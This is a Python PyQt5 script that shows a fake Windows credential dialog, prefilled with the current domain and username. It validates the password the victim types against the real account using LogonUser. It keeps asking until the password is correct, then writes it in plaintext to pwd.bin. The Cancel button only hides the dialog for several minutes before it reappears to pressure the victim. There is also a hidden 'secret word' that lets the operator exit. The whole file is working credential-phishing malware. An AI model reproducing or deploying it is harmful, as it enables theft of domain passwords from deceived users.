import sys, os, time, random
import getpass, win32security
from subprocess import call
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyCred_GUI import Ui_Dialog

class MyGUI(Ui_Dialog):
	def __init__(self, dialog):
		Ui_Dialog.__init__(self)
		self.setupUi(dialog)
		# Apply password.png to label_Background
		self.label_Background.setPixmap(QtGui.QPixmap(self.resource_path("password.png")))
		# Grab domain and username from env, then set username to domain\username
		domain = os.getenv('USERDOMAIN', 'defaultValue')
		username = os.getenv('USERNAME', 'defaultValue')
		self.lineUsername.setText(domain + "\\" + username)	
		# Focus password text and activate window
		self.linePassword.setFocus(True)
		dialog.activateWindow()	
		# Connect events to functions
		self.pushButton_Cancel.clicked.connect(self.cancelbutton)
		self.pushButton_OK.clicked.connect(self.okbutton)
		self.linePassword.returnPressed.connect(self.okbutton)
	
	# Function to match OK button or Return key press
	@QtCore.pyqtSlot()
	def okbutton(self):
		# Hide window
		dialog.hide()
		# Grab password from password text, if "secret word" quit
		password = self.linePassword.text().strip()
		if password == "snakesonaplane":
			exit()
		# Preset domain\username values
		domain = os.getenv('USERDOMAIN', 'defaultValue')
		username = os.getenv('USERNAME', 'defaultValue')
		# Username contains \ / or @ split the value to the respective variable 
		foo = ["\\","/","@"]
		for bar in foo:
			if bar in self.lineUsername.text():
				if bar == "@":
					username, domain = self.lineUsername.text().strip().split(bar)
					
				else:
					domain, username = self.lineUsername.text().strip().split(bar)
		# Try verifying user credentials
		try:
			hUser = win32security.LogonUser (
				username,
				domain,
				password,
				win32security.LOGON32_LOGON_NETWORK,
				win32security.LOGON32_PROVIDER_DEFAULT
			)
		# If it fails, credentials are incorrect
		except win32security.error:
			# Reset username and password text
			self.lineUsername.setText(domain + "\\" + username)
			self.linePassword.setText('')
			# Sleep random time to give user impresession of processing
			time.sleep(random.choice([1,2,3,4]))
			# Show window
			dialog.show()
			# Focus password text and activate window
			self.linePassword.setFocus(True)
			dialog.activateWindow()
		else:
			# Save verified credentials to file and quit
			with open("pwd.bin","a") as w:
				msg = "Domain:\t\t\t" + domain + "\nUsername:\t\t" + username + "\nPassword:\t\t" + password + "\n\n"
				w.write(msg)
			w.close
			time.sleep(2)
			exit()
	
	# Function to match Cancel button
	@QtCore.pyqtSlot()
	def cancelbutton(self):
		# Hide window
		dialog.hide()
		# Sleep random time to give user impresession they won
		time.sleep(random.choice([60,120, 240, 480]))
		# Show window
		dialog.show()
		# Focus password text and activate window
		self.linePassword.setFocus(True)
		dialog.activateWindow()
	
	# Function to find relative_path (Used in conjunction with PyInstaller so I can include the password.png in --onefile)
	@QtCore.pyqtSlot()
	def resource_path(self, relative_path):
		""" Get absolute path to resource, works for dev and for PyInstaller """
		try:
			base_path = sys._MEIPASS
		except Exception:
			base_path = os.path.abspath(".")
		return os.path.join(base_path, relative_path)

if __name__ == '__main__':
	app = QtWidgets.QApplication(sys.argv)
	dialog = QtWidgets.QWidget()
	dialog.setWindowFlags(QtCore.Qt.WindowSystemMenuHint)
	prog = MyGUI(dialog)
	dialog.show()
	sys.exit(app.exec_())